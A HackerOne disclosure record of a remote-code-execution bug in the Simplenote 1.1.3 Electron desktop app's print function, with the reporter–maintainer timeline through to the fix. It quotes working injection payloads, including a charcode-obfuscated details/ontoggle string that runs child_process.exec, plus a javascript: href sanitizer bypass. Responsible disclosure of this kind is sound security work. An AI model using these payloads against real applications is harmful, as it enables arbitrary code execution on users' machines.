---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/code-injection
  - env/web
substate: "resolved"
weakness: "Code Injection"
enriched: true
date: 2018-07-26
submitted: 2018-05-27T09:33:36.011Z
bounty_usd: null
votes: 28
cve: []
program: "[[programs/automattic|Automattic]]"
reporter: "luigigubello"
source: "https://hackerone.com/reports/358049"
title: "RCE via Print function [Simplenote 1.1.3 - Desktop app] "
---
# RCE via Print function [Simplenote 1.1.3 - Desktop app] 

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 28 | **Program:** Automattic | **Disclosed:** 2018-07-26

- Report: [https://hackerone.com/reports/358049](https://hackerone.com/reports/358049)
- CWE: Code Injection
- Submitted: 2018-05-27T09:33:36.011Z

## Timeline

- **Report Filed**
- **Report Severity Updated**
- **2018-05-27** @luigigubello: It is possible to use a shorter payload:
`<script>require('child_process').exec('/usr/bin/gnome-calculator',function(){})</script>`

Then you use `writeln()` and `String.FromCharcode()`. The final payload is:
`">'><details/open/ontoggle=writeln(String.fromCharCode(60,115,99,114,105,112,116,62,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,40,39,47,117,115,114,47,98,105,110,47,103,110,111,109,101,45,99,97,108,99,117,108,97,116,111,114,39,44,102,117,110,99,116,105,111,110,40,41,123,125,41,60,47,115,99,114,105,112,116,62))>`
- **2018-05-28** @roundhill: Thanks for the report @luigigubello! I remember noticing this a little while ago, but looks like a follow-up PR didn't happen to actually fix it. This report is a great reminder to get it fixed asap!

https://github.com/Automattic/simplenote-electron/pull/724#discussion_r174950892
- **2018-05-28** @luigigubello: Hi @roundhill 
I think you should fix. I did not know the topic on Github, but this vulnerability is an RCE. I hope you will fix this bug soon :) do you want to triage this report?
- **2018-05-28** @roundhill: Yes, working on it now. Thanks again.
- **2018-05-28** @luigigubello: Good work :)

Best  regards
- **2018-06-05** @luigigubello: Hi :)

Any news about the fix?
- **2018-06-14** @roundhill: Hi @luigigubello, the 1.1.4 update contains the fix for this issue. Can you please confirm?

Details here: https://github.com/Automattic/simplenote-electron/pull/766
- **Report Needs More Info**
- **Report New**
- **2018-06-15** @luigigubello: I tried to look at the source code, but I do not understand where the bug is. In [your fix](https://github.com/Automattic/simplenote-electron/commit/35c816eba4637282e0d0adddd696b3c3b142c69f) I read (*line 232-233*)
 ```
+              dangerouslySetInnerHTML={{
+                __html: renderNoteToHtml(content),
 ```

**renderNoteToHtml** is in these two files: [here](https://github.com/Automattic/simplenote-electron/blob/master/lib/utils/render-note-to-html.js) and [here](https://github.com/Automattic/simplenote-electron/blob/master/lib/utils/sanitize-html.js).

In **sanitize-html.js** there is the code:
 ```
      // only valid http(s) URLs are allowed
      if (('href' === name || 'src' === name) && validUrl.isWebUri(value)) {
        return false;
      }
 ```
So **href="javascript:alert(1)"** should not work. Indeed in the Preview it doesn't work, but it works in the print moment. Another strange thing: **href="javascript:alert(1)"** runs, but **href="javascript:write(1)"** does not seem to run.

I'm curious to understand the problem in the code.
Thank you.
- **2018-06-18** @luigigubello: Hi @roundhill , 

Do you confirm the bug?

Best regards
- **2018-06-18** @roundhill: Taking a look now, will get back to you soon.
- **2018-06-19** @roundhill: I've created a fix here, if you are curious about the details: https://github.com/Automattic/simplenote-electron/pull/771
- **2018-06-20** @luigigubello: Good, thanks @roundhill :)

When you want you can set the report like "Resolved"!
- **Report Resolved**
- **Bounty Awarded**
- **Agreed On Going Public**
- **Report Became Public**
